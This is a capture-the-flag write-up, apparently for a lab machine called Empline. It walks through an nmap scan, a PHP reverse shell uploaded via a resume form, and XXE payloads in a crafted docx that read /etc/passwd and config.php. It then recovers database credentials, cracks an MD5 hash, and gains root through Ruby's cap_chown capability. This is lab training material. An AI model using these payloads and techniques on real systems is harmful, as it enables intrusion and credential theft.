# Enumeration

Starting with nmap
```bash
Host is up (0.17s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c0:d5:41:ee:a4:d0:83:0c:97:0d:75:cc:7b:10:7f:76 (RSA)
|   256 83:82:f9:69:19:7d:0d:5c:53:65:d5:54:f6:45:db:74 (ECDSA)
|_  256 4f:91:3e:8b:69:69:09:70:0e:82:26:28:5c:84:71:c9 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Empline
3306/tcp open  mysql   MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
|   Thread ID: 96
|   Capabilities flags: 63487
|   Some Capabilities: SupportsLoadDataLocal, ConnectWithDatabase, ODBCClient, LongPassword, Support41Auth, Speaks41ProtocolNew, Speaks41ProtocolOld, SupportsTransactions, DontAllowDatabaseTableColumn, FoundRows, IgnoreSigpipes, LongColumnFlag, SupportsCompression, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: cM8nEJ&yV~9>l'xIDZxk
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.35 seconds
```
### PORT 80

The port 80 hosted a website.
![image](https://user-images.githubusercontent.com/43528306/138642355-d900a779-6dd5-4f98-8b7a-642c5e7d243d.png)

The website seems almost static except the `Employement` tab which points us to `job.empline.thm/careers`.
Looking at this subdomain, we found

![image](https://user-images.githubusercontent.com/43528306/138642494-2e4bd5e0-90eb-4bf1-9790-54828408558b.png)

Using `Apply to this job` we have a upload functionality.
# Exploit
It was exploitable in two ways:

## Using Uploading PHP shell
As the application was written in PHP, we can try to upload a PHP reverse shell. Uploading the Shell and submitting the form, we recieved `Resume was uploaded succesful`. Navigating to 
`job.empline.thm/upload`, we can see our PHP shell was uploaded successfuly. Using this we can get a reverse shell.


## Using XXE 
The application was vulnerable to XXE attack [here](https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/), where we can upload are resume. Docx file are basically zipped XML files. As the application was reading our *resume.docx* and extracting out the data,
we can assume that its parsing the whole file to extract data from it. To create a malicious docx, we need
```python
from docx import Document

document= Document()
paragraph = document.add_paragraph("Rocklee")
document.save('resume.docx')
```
### Creating Malicious docx
The above script will create a simple docx file with our name in it. 
- Now, we need to unzip the docx file.
- Modify the content of `word/document.xml`. After first line, add following paylaod:
```xml
<!DOCTYPE test [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
```
- Save the changes
- Zip the file again with modified contents
```bash
zip resume.docx word/document.xml
```

Upload the file and we have the contents of passwd file.

![image](https://user-images.githubusercontent.com/43528306/138641030-8cda02cf-73bd-4888-9582-7c6be54b2c23.png)

As the application was open-source, from github we found the whole directory structure. Our next task was to extract data from `config.php`
```xml
<!DOCTYPE [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=config.php'>]>
```

Using this, we found the credentials to database.
```php
/* Database configuration. */                                                       
define('DATABASE_USER', 'james');                                                   
define('DATABASE_PASS', 'ng6pUFvsGNtw');                                            
define('DATABASE_HOST', 'localhost');                                                                                                                                    
define('DATABASE_NAME', 'opencats');
```
> Initially, I got foothold using PHP shell upload

### Shell as www-data

Looking at `config.php`
```php
/* Database configuration. */                                                       
define('DATABASE_USER', 'james');                                                   
define('DATABASE_PASS', 'ng6pUFvsGNtw');                                            
define('DATABASE_HOST', 'localhost');                                                                                                                                    
define('DATABASE_NAME', 'opencats');
```

Looking at users on the system.
```bash
cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash
george:x:1002:1002::/home/george:/bin/bash
```
Using the creds we found, we can login into mysql.
```mysql
MariaDB [opencats]> select * from user\G;
...[snip]...
*************************** 3. row ***************************
                  user_id: 1251
                  site_id: 1
                user_name: george
                    email: 
                 password: 86d0dfda99dbebc424eb4407947356ac
...[snip]...
```
The database contains a users table with password and username. The password hash was MD5 which we can easily decrypt using any online service 
Using crackstation, we found the password `pretonnevippasempre`

### Shell as George
Now we can read user.txt file.

```bash
george@empline:/$ getcap -r / 2>/dev/null 
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/local/bin/ruby = cap_chown+ep
```
Ruby was having a capablity of `cap_chown`, using this we can change owner of a file. Looking at docs, we found a way to do this in ruby which require user-id and gid to which we want to change this to.
```bash
george@empline:/dev/shm$ ruby -e 'require "fileutils";FileUtils.chown(1002,1002,"/root")'                                                                                
george@empline:/dev/shm$ cd /root                                                                                                                                        
george@empline:/root$ ls -la                                                                                                                                             
total 36                                                                                                                                                                 
drwx------  4 george george 4096 Jul 20 19:52 .                                                                                                                          
drwxr-xr-x 24 root   root   4096 Oct 25 04:34 ..                                                                                                                         
-rw-------  1 root   root      5 Jul 20 19:52 .bash_history                                                                                                              
-rw-r--r--  1 root   root   3106 Apr  9  2018 .bashrc                                                                                                                    
drwxr-xr-x  3 root   root   4096 Jul 20 19:49 .local                                                                                                                     
-rw-r--r--  1 root   root    148 Aug 17  2015 .profile                                                                                                                   
drwx------  2 root   root   4096 Jul 20 19:45 .ssh                                                                                                                       
-rw-r--r--  1 root   root    227 Jul 20 19:48 .wget-hsts                                                                                                                 
-rw-r--r--  1 root   root     33 Jul 20 19:48 root.txt           
```

ROOT!!
